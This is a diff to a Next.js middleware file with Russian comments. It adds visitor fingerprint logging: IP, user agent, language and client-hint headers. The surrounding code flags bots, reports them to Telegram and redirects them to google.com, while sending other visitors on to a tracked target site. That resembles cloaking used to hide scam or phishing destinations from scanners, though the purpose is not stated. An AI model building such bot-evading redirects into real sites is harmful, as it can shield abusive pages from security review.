@@ -1,4 +1,3 @@
-
 // middleware.js
 import { NextResponse } from "next/server";
 
@@ -243,6 +242,12 @@ export async function middleware(req) {
     console.warn("Invalid envUrl:", envUrl);
   }
 
+  // дополнительные хедеры посетителя для логов
+  const acceptLanguage = getHeaderValue(req, "accept-language") || "-";
+  const secChUa = getHeaderValue(req, "sec-ch-ua") || getHeaderValue(req, "sec-ch-ua-full") || "-";
+  const secChUaMobile = getHeaderValue(req, "sec-ch-ua-mobile") || "-";
+  const secChUaPlatform = getHeaderValue(req, "sec-ch-ua-platform") || "-";
+
   // пустой юа — сразу считаем ботом
   if (!isHumanLike) {
     notifyTelegram(
@@ -279,7 +284,27 @@ export async function middleware(req) {
     );
     return NextResponse.redirect("https://google.com");
   }
-  console.log(`mainDomain: ${mainDomain} | Referer: ${refererHeader || "—"}`);
+
+  // --- улучшенный лог: теперь вместе с mainDomain и referer выводим данные посетителя ---
+  try {
+    console.log(JSON.stringify({
+      mainDomain,
+      referer: refererHeader || "—",
+      url,
+      method,
+      ip,
+      ua: ua || "—",
+      acceptLanguage,
+      secChUa,
+      secChUaMobile,
+      secChUaPlatform,
+      timestamp: new Date().toISOString()
+    }));
+  } catch (e) {
+    // на случай если console.log не поддерживает сложные объекты в вашей среде
+    console.log(`mainDomain: ${mainDomain} | Referer: ${refererHeader || "—"} | UA: ${ua || "—"} | IP: ${ip}`);
+  }
+
   // --- добавляем параметр src=envUrl в ссылку ---
   const target = new URL(URL_SITE);
   target.searchParams.set("s3", mainDomain);
@@ -290,5 +315,3 @@ export async function middleware(req) {
 
 // применяем на все роуты
 export const config = { matcher: ["/:path*"] };
-
-
